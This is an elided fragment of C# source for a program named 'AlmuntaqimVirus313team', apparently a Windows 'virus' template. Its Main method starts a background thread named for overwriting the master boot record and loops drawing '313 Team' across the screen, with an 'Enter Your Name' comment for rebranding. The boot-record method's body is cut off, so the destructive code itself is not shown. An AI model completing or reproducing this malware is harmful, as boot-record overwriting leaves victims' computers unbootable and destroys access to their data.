...
class AlmuntaqimVirus313team
{
    ...
    static void Main()
    {
        Thread AlmuntaqimVirus313TeamMBRThread = new Thread(AlmuntaqimVirus313TeamMBR);
        AlmuntaqimVirus313TeamMBRThread.IsBackground = true;
        AlmuntaqimVirus313TeamMBRThread.Start();
        ...
        while (true)
        {
            ...
            using (Graphics g = Graphics.FromHdc(hdc))
            {
                ...
                using (Brush textBrush = new SolidBrush(randomColor))
                {
                    ...
                    int textY = iconY;
                    g.DrawString("313 Team", //Enter Your Name
    ...
    static void AlmuntaqimVirus313TeamMBR()
    {
